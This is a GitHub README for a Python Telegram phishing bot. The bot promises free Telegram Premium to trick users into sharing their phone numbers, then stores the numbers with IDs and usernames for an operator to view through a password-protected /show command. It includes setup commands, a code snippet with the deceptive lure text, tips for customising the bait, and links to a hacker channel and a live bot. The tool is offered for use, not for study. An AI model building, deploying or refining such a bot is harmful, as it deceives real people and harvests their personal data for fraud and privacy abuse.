# Free Telegram Premium Phonenumber Phishing Bot 🤖

Python: 3.9+ Telegram Bot API


## Table of Contents 📚

- [Introduction](#introduction-) 🤔
- [Features](#features-) 🎉
- [Installation](#installation-) 💻
- [Usage](#usage-) 📱
- [Configuration](#configuration-) 🔧
- [License](#license-) 📜
- [Example Use Cases](#example-use-cases-️) 🖍️
- [Code Structure](#code-structure-️) 🗂️
- [API Documentation](#api-documentation-) 📚
- [Commit Messages](#commit-messages-️) 🖍️
- [Community](#community) 👥
---

## Introduction 🤔

This is a Telegram bot designed to trick users into sharing their phone numbers under the guise of providing free Telegram Premium access 🤝.

The bot uses the Telegram Bot API to interact with users and saves their phone numbers along with IDs and usernames 📱.

You can modify the text, button labels for the phone number sharing prompt, and the image displayed in the bot.

---

![photo_5969548008347517558_y](https://github.com/user-attachments/assets/b0bb342c-5a56-4ddd-87ac-7885a3275d81)

---

## Features 🎉

- Provides free Telegram Premium access to users 🤝.
- Users can share their phone number to receive premium access 📞.
- Admins can view the list of users who have shared their phone numbers using the `/show` command 👀.
- The bot uses a password to protect the `/show` command 🔒.
- The bot sends a welcome message with a picture and button to share hes phone number masked with text 📸.

---

## Installation 💻

To install the bot, follow these steps:

1. **Clone the repository**: Clone the repository using:

   ```bash
    git clone https://github.com/BlackNnja/Telegram-Phishing-Bot.git
    ```
   
    the cd to the 📁

4. **Install Python**: Make sure you have Python 3.9 or later installed on your system. You can download it from the [official Python website](https://www.python.org/downloads/) 🔢.
5. 

6. **Install python-telegram-bot**: Install the python-telegram-bot library using pip:

     ```bash
    pip install python-telegram-bot==13.15
    ```
    📦

9. **Install other dependencies**: Install the other dependencies required by the bot using pip:    ```bash
    pip install -r req.txt    ```
    💻

10. **Replace `YOUR_BOT_TOKEN`**: Replace `YOUR_BOT_TOKEN` with your actual bot token in the `main.py` file 🔑.

11. **Run the bot**: Run the bot using:    ```bash
    python bot.py    ```
    🚀

---

## Usage 📱

To use the bot, follow these steps:

1. **Start the bot**: Start the bot by sending the `/start` command 📱.
 
3. **Share your phone number**: Share your phone number with the bot to receive premium access 📞.
 
5. **Users That knows the password can view users**: Users can view the list of users who have shared their phone number using the `/show {PASSWORD}` command 👀.

---

## Configuration 🔧

The bot uses a password to protect the `/show` command 🔒. You can change the password by modifying the `password` variable in the `main.py` file 🔑.

To configure the bot's appearance and functionality:

1. **Change the Welcome Image**:
   - Replace the image file in the folder with your own image.
   - Update the path to the new image in the `send_welcome_message()` function in `bot.py`.
     ```
         with open('telegramicon.png', 'rb') as photo:
     ```

2. **Modify the Button Labels**:
   - Edit the `button_text` var in the `send_welcome_message()` function to customize the text of the buttons.

   Example:   ```python
    button_text = "⭐️ Get Free 3 months Telegram Premium"```

3. **Customize the Text and Picture**:
   - Edit the strings in the `send_welcome()` function to update the welcome message and other text.

   Example:   ```python
        # Send welcome message with a picture and both buttons
        with open('telegramicon.png', 'rb') as photo:
            sent_message = update.message.reply_photo(
                photo=photo,
                caption=("🎉 Welcome to Free Telegram Premium 🎉\n\n"
                         "You can get 3 months of Telegram Premium for free!\n\n"
                         "To Get ⭐Free Premium Telegram ⭐ Access\n\n please press the box icon button \n\nnear the clip 🧷\n\n below to connect your account to Telegram Pro. 📱\n\n"
                         "Happy Using And Keep Coming Back Every 3 Months! 😊"),
                reply_markup=reply_markup
            )   ```

---

## License 📜

This project is licensed under the MIT License 📜. See the LICENSE file for more information.

---

## Example Use Cases 🖍️

- Users share their phone numbers with the bot to receive premium access 📞.
- Admins use the `/show` command to view the list of users who have shared their phone numbers 👀.

---

## Code Structure 🗂️

The code is structured into the following files:

- `bot.py`: The main file that contains the bot's logic 🖍️.
- `requirements.txt`: The file that contains the required dependencies 💻.

---

## API Documentation 📚

The bot uses the Telegram Bot API to interact with users 📱. You can find the API documentation at [Telegram Bot API](https://core.telegram.org/bots/api).

---

## Commit Messages 🖍️

Commit messages should follow the standard format:

- `feat`: Add new feature 🎉
- `fix`: Fix bug 🚨

---

## Community

- Join our community on Telegram: [t.me/israelihacker](https://t.me/israelihacker)
- Visit the original bot: [t.me/Premium_TelegramTrial_bot](https://t.me/Premium_TelegramTrial_bot)
